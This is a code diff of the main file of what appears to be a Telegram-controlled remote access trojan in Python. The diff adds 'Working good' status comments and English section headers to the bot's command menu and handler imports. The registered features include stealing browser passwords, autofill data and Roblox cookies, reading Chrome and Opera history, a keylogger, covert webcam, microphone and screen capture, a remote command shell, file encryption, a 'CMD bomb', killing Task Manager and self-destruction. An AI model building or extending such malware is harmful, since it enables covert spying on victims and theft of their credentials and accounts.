@@ -176,93 +176,93 @@ async def cmd_start(message: types.Message):
 
 
     kb = [
-        [
-            types.KeyboardButton(text="Антивирус"),
-            types.KeyboardButton(text="Скриншот"), # FIXED
+        [ 
+            types.KeyboardButton(text="Антивирус"),                     # Working good
+            types.KeyboardButton(text="Скриншот"),                      # FIXED  Working good
         ],
         [
-            types.KeyboardButton(text="Процесы"),
-            types.KeyboardButton(text="Фото с камеры")
+            types.KeyboardButton(text="Процесы"),                       # Working good    
+            types.KeyboardButton(text="Фото с камеры")                  # Working good
         ],
         [
-            types.KeyboardButton(text="Полный отчет по процесам"),
-            types.KeyboardButton(text="Завершить процесс")
+            types.KeyboardButton(text="Полный отчет по процесам"),      # Working good
+            types.KeyboardButton(text="Завершить процесс")              # Working good
         ],
         [
-            types.KeyboardButton(text="Создать папку"),
-            types.KeyboardButton(text="Удалить папку")
+            types.KeyboardButton(text="Создать папку"),                 # Working good
+            types.KeyboardButton(text="Удалить папку")                  # Working good
         ],
         [
-            #types.KeyboardButton(text="Содержание директории"), working bad (maybe fixed later)
-            types.KeyboardButton(text="Переместиться по директории [ Просмотр папок ]")
+            #types.KeyboardButton(text="Содержание директории"), working bad (maybe fixed later)       
+            types.KeyboardButton(text="Переместиться по директории [ Просмотр папок ]")                # Working good
         ],
         [
-            types.KeyboardButton(text="Данные ПК"),
-            types.KeyboardButton(text="Диагностика сети")
+            types.KeyboardButton(text="Данные ПК"),                     # Working good
+            types.KeyboardButton(text="Диагностика сети")               # Working good
         ],
         [
-            types.KeyboardButton(text="Запись с веб камеры"),
-            types.KeyboardButton(text="Запись аудио")
+            types.KeyboardButton(text="Запись с веб камеры"),           # Working good
+            types.KeyboardButton(text="Запись аудио")                   # Working good
         ],
         [
-            types.KeyboardButton(text="Открыть файл"),
-            types.KeyboardButton(text="Загрузить файл")
+            types.KeyboardButton(text="Открыть файл"),                  # Working good
+            types.KeyboardButton(text="Загрузить файл")                 # Working good
         ],
         [
-            types.KeyboardButton(text="Скачать файл"),
-            types.KeyboardButton(text="Удалить файл")
+            types.KeyboardButton(text="Скачать файл"),                  # Working good
+            types.KeyboardButton(text="Удалить файл")                   # Working good
         ],
         [
-            types.KeyboardButton(text="Зашифровать файл"),
-            types.KeyboardButton(text="Расшифровать файл")
+            types.KeyboardButton(text="Зашифровать файл"),              # Working good
+            types.KeyboardButton(text="Расшифровать файл")              # Working good
         ],
         [
-            types.KeyboardButton(text="История хрома"),
-            types.KeyboardButton(text="История оперы")
+            types.KeyboardButton(text="История хрома"),                 # Working good
+            types.KeyboardButton(text="История оперы")                  # Working good
         ],
         [
-            types.KeyboardButton(text="Автозаполнения браузера [new]"), # NEW
-            types.KeyboardButton(text="Пароли браузера [new]")          # NEW
+            types.KeyboardButton(text="Автозаполнения браузера [new]"), # NEW  Working good
+            types.KeyboardButton(text="Пароли браузера [new]")          # NEW  Working bad
         ],
         [
-            types.KeyboardButton(text="Роблокс куки [new]"),            # NEW
-            types.KeyboardButton(text="Командная строка [new]")         # NEW
+            types.KeyboardButton(text="Роблокс куки [new]"),            # NEW  Working good (with out Opera Gx)
+            types.KeyboardButton(text="Командная строка [new]")         # NEW  Working good
         ],
         [
-            types.KeyboardButton(text="ALT + F4"),
-            types.KeyboardButton(text="Свернуть все окна")
+            types.KeyboardButton(text="ALT + F4"),                      # Working good
+            types.KeyboardButton(text="Свернуть все окна")              # Working good
         ],
         [
-            types.KeyboardButton(text="Посмотреть буфер обмена"),
-            types.KeyboardButton(text="Изменить буфер обмена")
+            types.KeyboardButton(text="Посмотреть буфер обмена"),       # Working bad (fix later)
+            types.KeyboardButton(text="Изменить буфер обмена")          # Working good
         ],
         [
-            types.KeyboardButton(text="Закрыть диспетчер задач"),
-            types.KeyboardButton(text="Открыть ссылку")
+            types.KeyboardButton(text="Закрыть диспетчер задач"),       # Working good
+            types.KeyboardButton(text="Открыть ссылку")                 # Working good
         ],
         [
-            types.KeyboardButton(text="Включить звук"),
-            types.KeyboardButton(text="Выключить звук")
+            types.KeyboardButton(text="Включить звук"),                 # Working good
+            types.KeyboardButton(text="Выключить звук")                 # Working good
         ],
         [
-            types.KeyboardButton(text="Звук на 100%"),
-            types.KeyboardButton(text="CMD бомба")
+            types.KeyboardButton(text="Звук на 100%"),                  # Working good
+            types.KeyboardButton(text="CMD бомба")                      # Working good
         ],
         [
-            types.KeyboardButton(text="Выключить ПК"),
-            types.KeyboardButton(text="Перезагрузить ПК")
+            types.KeyboardButton(text="Выключить ПК"),                  # Working good
+            types.KeyboardButton(text="Перезагрузить ПК")               # Working good
         ],
         [
-            types.KeyboardButton(text="Перемистить файл"),
-            types.KeyboardButton(text="Поменять обои")
+            types.KeyboardButton(text="Перемистить файл"),              # Working good
+            types.KeyboardButton(text="Поменять обои")                  # Working good
         ],
         [
-            types.KeyboardButton(text="key logger [new]"), # NEW 
-            types.KeyboardButton(text="key logs [new]") # NEW
+            types.KeyboardButton(text="key logger [new]"),              # NEW  Working good
+            types.KeyboardButton(text="key logs [new]")                 # NEW  Working good
         ],
         [
-            types.KeyboardButton(text="воспроизвести звук [new]"),# NEW 
-            types.KeyboardButton(text="Самоуничтожение")
+            types.KeyboardButton(text="воспроизвести звук [new]"),      # NEW  Working good
+            types.KeyboardButton(text="Самоуничтожение")                # Working good
         ],
     ]
     keyboard = types.ReplyKeyboardMarkup(
@@ -274,127 +274,127 @@ async def cmd_start(message: types.Message):
 user_directories = {}
 
 
-############################  CMD COMMAND  ##############################
+############################  CMD COMMAND  ################################
 
 from lib.System.PC.cmd import register_cmd_comand
 
 register_cmd_comand(dp)
 
-###########################  ROBLOX COOKIE  #############################
+###########################  ROBLOX COOKIE  ###############################
 
 from lib.Credintial.roblosecurity import register_roblosecurity_handler
 
 register_roblosecurity_handler(dp)
 
-#########################  BROWSER PASSWORDS  ###########################
+#########################  BROWSER PASSWORDS  #############################
 
 from lib.Credintial.password import register_password_handler
 
 register_password_handler(dp)
 
-#########################  BROWSER AUTOFILL  ###########################
+############################  BROWSER AUTOFILL  ###########################
 
 from lib.Credintial.autofill import register_autofill_handler
 
 register_autofill_handler(dp)
 
-###########################  PLAY SOUND  ###############################
+##############################  PLAY SOUND  ###############################
 
 from lib.Access.Audio.play_sound import register_play_sound_handlers
 
 register_play_sound_handlers(dp)
 
-############################# KEY LOGGER ###############################№
+#############################  KEY LOGGER  ################################
 
 from lib.System.Key_logger.key_logger_handlers import key_logger_handlers
 
 key_logger_handlers(dp)
 
-############################ KEY LOGS ####################################
+############################  KEY LOGS  ###################################
 
 from lib.System.Key_logger.key_logs_handlers import key_logs_handlers
 
 key_logs_handlers(dp)
 
-########################### ANTIVIRUS ####################################
+################################  ANTIVIRUS  ##############################
 
 from lib.System.Antivirus.antivirus_handlers import register_antivirus_handlers
 
 register_antivirus_handlers(dp)
 
-##########################  SCREENSHOT  #############################
+##############################  SCREENSHOT  ###############################
 
 from lib.Access.Screenshot.screenshot_handlers import register_screenshot_handlers
 
 register_screenshot_handlers(dp)
 
-######################## Делаем снимок с камеры  #########################
+##############################  SNAPSHOT  #################################
 
 from lib.Access.Webcam.Snapshot import register_snapshot_handlers
 
 register_snapshot_handlers(dp)
 
-##########################  Список процессов  ############################
+###############################  PROCCESES ################################
 
 from lib.System.Procceses.process import register_processes_handlers
 
 register_processes_handlers(dp)
 
-########################  Полный список процессов  ########################
+#############################  FULL PROCCESSES  ###########################
 
 from lib.System.Procceses.fullprocesses import register_full_processes_handlers
 
 register_full_processes_handlers(dp)
 
-##########################  Завершение процесса ############################
+###########################  TERMINATE PROCCES ############################
 
 from lib.System.Procceses.terminate_process import register_terminate_process_handlers
 
 register_terminate_process_handlers(dp)
 
-############################  Создать папку  ################################
+############################  CREATE FOLDER  ##############################
 
 from lib.System.Folders.create_folder import register_create_folder
 
 register_create_folder(dp)
 
-############################  Удалить папку  ################################
+############################  DELETE FOLDER  ##############################
 
 from lib.System.Folders.delete_fodlder import register_folder_delete
 
 register_folder_delete(dp)
 
-###########################  Скачать файл  ###################################
+###########################  DOWNLOAD FILE  ###############################
 
 from lib.System.File.download_file import register_download_file
 
 register_download_file(dp)
 
-#############################  Удалить файл  #################################
+#############################  DELETE FILE  ###############################
 
 from lib.System.File.delete_file import register_delete_file
 
 register_delete_file(dp)
 
-########################  Содержание директории  ############################
+##########################  DIRECTORY VALUE  ##############################
 
 from lib.System.More.directory_value import register_directory_value
 
 register_directory_value(dp)
 
-#########################  Перейти к директории  #############################
+##############################  CHANGE CD  ################################
 
 from lib.System.More.move_to_directory import register_cd
 
 register_cd(dp)
 
-##########################  Chrome history  ################################
+##########################  CHROME HISTORY  ###############################
 
 from lib.Credintial.Chrome_history import register_chrome_history_handlers
 
 register_chrome_history_handlers(dp)
 
-#####################  Делаем сьемку с веб-камеры  #######################
+############################  RECORD WEBCAM  ##############################
 
 from lib.Access.Webcam.Web_record import register_webcam_record_handlers
 
@@ -406,7 +406,7 @@ from lib.System.Folders.altf4 import register_alt_f4_handlers
 
 register_alt_f4_handlers(dp)
 
-##############################  Закрытие окон  ############################
+#############################  CLOSE ALL WINDOW  ##########################
 
 from lib.System.Folders.closefolders import register_minimize_all_windows_handlers
 
@@ -416,120 +416,119 @@ register_minimize_all_windows_handlers(dp)
 ############################ OPEN FOLDERS #################################
 
 from lib.System.Folders.open_folders import register_open_file_handlers
-from lib.states import DirectoryStateSaveFiles
 
 register_open_file_handlers(dp)
 
 
-############################  Загрузить файл  #############################
+###############################  LOAD FILE  ###############################
 
 from lib.System.File.load_file import register_load_file
 
 register_load_file(dp)
 
-############################# Запись аудио ###############################
+#################################  AUDIO  #################################
 
 from  lib.Access.Audio.recordmic_handlers import register_audio_handlers
 
 register_audio_handlers(dp)
 
-#######################  Посмотреть буфер обмена  #########################
+#############################  CHECK COPIED  ##############################
 
 from lib.System.More.check_copied import register_check_copied
 
 register_check_copied(dp)
 
-###########################  Открыть ссылку  ##############################
+###############################  OPEN URL  ################################
 
 from lib.System.More.open_url import register_open_url
 
 register_open_url(dp)
 
-########################  Закрыть диспетчер задач  ##########################
+##########################  СLOSE DISPETCHER  #############################
 
 from lib.System.More.close_dp import register_close_dp
 
 register_close_dp(dp)
 
-###########################  Opera history  ############################
+###########################  OPERA HISTORY  ###############################
 
 from lib.Credintial.Opera_history import register_opera_history_handlers
 
 register_opera_history_handlers(dp)
 
-###########################  Выключить звук  #############################
+##############################  SOUND OFF  ################################
 
 from lib.System.Sound.Sound_off import register_mute_handlers
 
 register_mute_handlers(dp)
 
-###########################  Включить звук  ##############################
+###############################  SOUND ON  ################################
 
 from lib.System.Sound.Sound_on import register_sound_handlers
 
 register_sound_handlers(dp)
 
-########################  Включить звук на 100%  ##########################
+###########################  SOUND ONN 100%  ##############################
 
 from lib.System.Sound.volume_100 import register_volume_100
 
 register_volume_100(dp)
 
-##########################  Зашифровать файл  #############################
+#############################  ENSRYPT FILE  ##############################
 
 from lib.System.Crypt.Encrypt import register_encrypt_handlers
 
 register_encrypt_handlers(dp)
 
-############################  Расшифровка  ###############################
+############################  DISCRYPT FILE  ##############################
 
 from lib.System.Crypt.discrypt import register_discrypt
 
 register_discrypt(dp)
 
-###############################  CMD Бомба  ###############################
+###############################  CMD BOMB  ################################
 
 from lib.System.PC.cmd_bomb import register_cmd_bomb
 
 register_cmd_bomb(dp)
 
-###########################  Информация про ПК  ###########################
+################################  PC DATA  ################################
 
 from lib.System.PC.pc_data import register_pc_data
 
 register_pc_data(dp)
 
-##########################  Информция про сеть  ##########################
+################################  WIFI DATA  ##############################
 
 from lib.System.PC.wifi_data import register_wifi_data
 
 register_wifi_data(dp)
 
-###########################  Выключение ПК  #############################
+#############################  PC SHUTDOWN  ###############################
 
 from lib.System.PC.pc_off import register_shutdown_handlers
 
 register_shutdown_handlers(dp)
 
-###########################  Перезапуск ПК  ##############################
+##############################  REBOOT PC  ################################
 
 from lib.System.PC.pc_reboot import register_reboot_handlers
 
 register_reboot_handlers(dp)
 
-############################  Смена обоев  ###############################
+##########################  WALLPAPER CHANGE  #############################
 
 from lib.System.PC.change_wallpaper import register_wallpaper_handlers
 
 register_wallpaper_handlers(dp)
 
-#########################  Перемещение файла  #############################
+###############################  MOVE FILE  ###############################
 
 from lib.System.Folders.move_file import register_move_file
 
 register_move_file(dp)
 
-#############################  Самоуничтожение  ###########################
+#############################  SELF DESTRICTION  ##########################
 
 from lib.System.PC.self_destruction import register_self_destruction
 
